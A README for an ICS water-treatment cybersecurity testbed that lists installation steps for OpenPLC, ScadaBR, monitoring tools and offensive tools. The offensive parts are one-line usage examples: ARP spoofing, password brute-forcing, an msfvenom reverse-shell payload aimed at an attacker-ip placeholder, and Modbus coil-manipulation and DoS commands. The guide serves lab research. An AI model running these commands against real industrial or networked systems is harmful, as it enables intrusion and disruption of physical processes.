# ICS_Water_testbed_cyber
Attack scenarios and Mitigation solutions on a docker based simulated ICS environment
ICS Water Testbed - Tools Installation Guide
This README provides installation instructions for all tools used in the Industrial Control Systems (ICS) cybersecurity testbed research.

Table of Contents
ICS/SCADA Components
Network Analysis Tools
Web Application Testing
Security Testing Frameworks
Monitoring and Logging
Network Security Tools
Database Tools
Development Environment
System Utilities
Quick Installation Script
ICS/SCADA Components
OpenPLC
Purpose: Open-source PLC runtime that executes ladder logic programs and communicates via Modbus/TCP.

bash
# Install dependencies
sudo apt update
sudo apt install -y build-essential pkg-config bison flex autoconf automake libtool make git

# Clone and build OpenPLC
git clone https://github.com/thiagoralves/OpenPLC_v3.git
cd OpenPLC_v3
./install.sh linux
ScadaBR
Purpose: Open-source SCADA system for monitoring and controlling industrial processes via web interface.

bash
# Prerequisites
sudo apt install -y openjdk-8-jdk tomcat9 mysql-server

# Download and install ScadaBR
wget http://sourceforge.net/projects/scadabr/files/Software/ScadaBR_1.1.0_Installer.jar
java -jar ScadaBR_1.1.0_Installer.jar
Python Libraries for Process Simulation
Purpose: Libraries for implementing the physical process simulator and Modbus communication.

bash
# Create virtual environment
python3 -m venv ics-env
source ics-env/bin/activate

# Install required libraries
pip install pymodbus          # Modbus protocol implementation
pip install pyModbusTCP       # Alternative Modbus TCP library
pip install pyyaml            # YAML configuration parsing
pip install numpy             # Numerical calculations
pip install matplotlib        # Data visualization
pip install requests          # HTTP requests
Network Analysis Tools
Wireshark
Purpose: Network protocol analyzer for capturing and analyzing Modbus/TCP traffic.

bash
sudo apt install -y wireshark
sudo usermod -aG wireshark $USER
# Logout and login to apply group changes
tcpdump
Purpose: Command-line packet analyzer for network traffic capture.

bash
sudo apt install -y tcpdump

# Usage example:
# tcpdump -i eth0 -w capture.pcap port 502
Nmap
Purpose: Network discovery and security scanning tool.

bash
sudo apt install -y nmap

# Usage examples:
# nmap -sn 192.168.1.0/24    # Network discovery
# nmap -p 502 target-ip      # Modbus port scan
arp-scan
Purpose: ARP scanning tool for discovering devices on local network.

bash
sudo apt install -y arp-scan

# Usage example:
# arp-scan -l
dsniff (arpspoof)
Purpose: ARP spoofing tool for man-in-the-middle attacks.

bash
sudo apt install -y dsniff

# Usage example:
# arpspoof -i eth0 -t target1 target2
Web Application Testing
WhatWeb
Purpose: Web application fingerprinting tool to identify technologies and frameworks.

bash
sudo apt install -y whatweb

# Usage example:  
# whatweb http://target-ip:8080
Nikto
Purpose: Web vulnerability scanner for identifying security issues in web applications.

bash
sudo apt install -y nikto

# Usage example:
# nikto -h http://target-ip:8080
Medusa
Purpose: Fast, parallel password brute-forcing tool for various protocols.

bash
sudo apt install -y medusa

# Usage example:
# medusa -h target-ip -u admin -P passwords.txt -M http
Security Testing Frameworks
Metasploit Framework
Purpose: Penetration testing framework for developing and executing exploit code.

bash
# Install dependencies
sudo apt install -y curl wget gnupg2 software-properties-common

# Add Metasploit repository
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Initialize database
sudo msfdb init
msfvenom
Purpose: Payload generator and encoder (part of Metasploit Framework).

bash
# Already included with Metasploit installation above

# Usage example:
# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -f elf -o payload.elf
Matrix (Modbus Attack Tool)
Purpose: Specialized tool for testing Modbus protocol security vulnerabilities.

bash
# Clone the repository
git clone https://github.com/SpiderLabs/MATRIX.git
cd MATRIX

# Install Python dependencies
pip install pymodbus

# Usage examples:
# python3 matrix.py -H target-ip -p 502 -a read    # Read operations
# python3 matrix.py -H target-ip -p 502 -a coil    # Coil manipulation
# python3 matrix.py -H target-ip -p 502 -a dos     # DoS attack
Monitoring and Logging
Grafana
Purpose: Analytics and monitoring platform for visualizing time-series data and logs.

bash
# Add Grafana repository
wget -q -O - https://packages.grafana.com/gpg.key | sudo apt-key add -
echo "deb https://packages.grafana.com/oss/deb stable main" | sudo tee /etc/apt/sources.list.d/grafana.list

# Install Grafana
sudo apt update
sudo apt install -y grafana

# Start and enable service
sudo systemctl start grafana-server
sudo systemctl enable grafana-server
Loki
Purpose: Log aggregation system designed to store and query logs efficiently.

bash
# Download and install Loki
wget https://github.com/grafana/loki/releases/latest/download/loki-linux-amd64.zip
unzip loki-linux-amd64.zip
sudo mv loki-linux-amd64 /usr/local/bin/loki
sudo chmod +x /usr/local/bin/loki
Promtail
Purpose: Agent for collecting logs and sending them to Loki.

bash
# Download and install Promtail
wget https://github.com/grafana/loki/releases/latest/download/promtail-linux-amd64.zip
unzip promtail-linux-amd64.zip
sudo mv promtail-linux-amd64 /usr/local/bin/promtail
sudo chmod +x /usr/local/bin/promtail
htop
Purpose: Interactive process viewer for monitoring system resources.

bash
sudo apt install -y htop

# Usage: Simply run 'htop' to monitor CPU, memory, and processes
Network Security Tools
iptables
Purpose: Linux firewall utility for configuring network packet filtering rules.

bash
sudo apt install -y iptables iptables-persistent

# Save current rules
sudo iptables-save > /etc/iptables/rules.v4
WireGuard
Purpose: Modern VPN implementation for secure network tunneling.

bash
sudo apt install -y wireguard wireguard-tools

# Generate keys
wg genkey | tee privatekey | wg pubkey > publickey
Stunnel
Purpose: SSL/TLS tunneling proxy for securing unencrypted protocols.

bash
sudo apt install -y stunnel4

# Generate certificate
sudo openssl req -new -x509 -days 365 -nodes -out /etc/stunnel/server.crt -keyout /etc/stunnel/server.key
NGINX
Purpose: Web server and reverse proxy for securing web applications.

bash
sudo apt install -y nginx

# Start and enable service
sudo systemctl start nginx
sudo systemctl enable nginx
Database Tools
SQLite3
Purpose: Command-line interface for SQLite databases (used by OpenPLC).

bash
sudo apt install -y sqlite3

# Usage examples:
# sqlite3 database.db ".tables"        # List tables
# sqlite3 database.db "SELECT * FROM Users;"  # Query data
MySQL Client
Purpose: Command-line client for MySQL/MariaDB databases (used by ScadaBR).

bash
sudo apt install -y mysql-client

# Usage example:
# mysql -h hostname -u username -p database_name
Development Environment
Python3
Purpose: Programming language for simulation scripts and automation tools.

bash
sudo apt install -y python3 python3-pip python3-venv

# Create virtual environment
python3 -m venv project-env
source project-env/bin/activate
Git
Purpose: Version control system for managing code repositories.

bash
sudo apt install -y git

# Configure Git
git config --global user.name "Your Name"
git config --global user.email "your.email@example.com"
Vim
Purpose: Text editor for configuration files and script editing.

bash
sudo apt install -y vim

# Basic usage: vim filename.txt
System Utilities
Netcat
Purpose: Network utility for reading/writing data across network connections.

bash
sudo apt install -y netcat-traditional

# Usage examples:
# nc -l -p 4444              # Listen on port 4444
# nc target-ip 4444          # Connect to target
curl
Purpose: Command-line tool for transferring data with URLs.

bash
sudo apt install -y curl

# Usage example:
# curl -X GET http://target-ip:8080/api/data
wget
Purpose: Command-line utility for downloading files from web servers.

bash
sudo apt install -y wget

# Usage example:
# wget http://example.com/file.zip
net-tools
Purpose: Collection of network utilities including netstat, ifconfig, route.

bash
sudo apt install -y net-tools

# Usage examples:
# netstat -tulpn    # Show listening ports
# ifconfig          # Show network interfaces
Quick Installation Script
To install all tools at once, you can run this script:

bash
#!/bin/bash
# ICS Testbed Tools Installation Script

echo "Starting ICS Testbed Tools Installation..."

# Update system
sudo apt update && sudo apt upgrade -y

# Install all basic tools
sudo apt install -y \
    build-essential pkg-config bison flex autoconf automake libtool make git \
    openjdk-8-jdk tomcat9 mysql-server mysql-client \
    wireshark tcpdump nmap arp-scan dsniff \
    whatweb nikto medusa \
    curl wget gnupg2 software-properties-common \
    iptables iptables-persistent \
    wireguard wireguard-tools \
    stunnel4 \
    nginx \
    sqlite3 \
    python3 python3-pip python3-venv \
    vim \
    netcat-traditional \
    net-tools \
    htop \
    unzip

echo "Installing Grafana..."
# Add Grafana repository
wget -q -O - https://packages.grafana.com/gpg.key | sudo apt-key add -
echo "deb https://packages.grafana.com/oss/deb stable main" | sudo tee /etc/apt/sources.list.d/grafana.list
sudo apt update
sudo apt install -y grafana

echo "Installing Loki and Promtail..."
# Download and install Loki
wget https://github.com/grafana/loki/releases/latest/download/loki-linux-amd64.zip
unzip loki-linux-amd64.zip
sudo mv loki-linux-amd64 /usr/local/bin/loki
sudo chmod +x /usr/local/bin/loki

# Download and install Promtail
wget https://github.com/grafana/loki/releases/latest/download/promtail-linux-amd64.zip
unzip promtail-linux-amd64.zip
sudo mv promtail-linux-amd64 /usr/local/bin/promtail
sudo chmod +x /usr/local/bin/promtail

echo "Installing Metasploit Framework..."
# Install Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall && ./msfinstall

echo "Installing Matrix Modbus Tool..."
# Clone and setup Matrix
git clone https://github.com/SpiderLabs/MATRIX.git
cd MATRIX && cd ..

echo "Setting up Python environment..."
# Create Python virtual environment
python3 -m venv ics-testbed-env
source ics-testbed-env/bin/activate
pip install pymodbus pyModbusTCP pyyaml numpy matplotlib requests

# Add user to wireshark group
sudo usermod -aG wireshark $USER

echo "Installation complete!"
echo "Please logout and login to apply group changes."
echo "Don't forget to activate the Python environment: source ics-testbed-env/bin/activate"
Save this script as install_tools.sh, make it executable with chmod +x install_tools.sh, and run it with ./install_tools.sh.

Tool Categories Summary
Category	Tools	Purpose
ICS Components	OpenPLC, ScadaBR, Python Libraries	Core industrial control system simulation
Network Analysis	Wireshark, tcpdump, Nmap, arp-scan, dsniff	Network discovery and traffic analysis
Web Testing	WhatWeb, Nikto, Medusa	Web application security testing
Security Frameworks	Metasploit, msfvenom, Matrix	Penetration testing and exploit development
Monitoring	Grafana, Loki, Promtail, htop	System monitoring and log analysis
Network Security	iptables, WireGuard, Stunnel, NGINX	Network protection and tunneling
Database	SQLite3, MySQL Client	Database management and analysis
Development	Python3, Git, Vim	Development environment
System Utilities	Netcat, curl, wget, net-tools	System administration and networking
Note: This guide provides the basic installation of tools used in the ICS cybersecurity testbed. Each tool requires proper configuration and understanding of its parameters for effective use in the research environment. Always ensure you have proper authorization before using security testing tools.

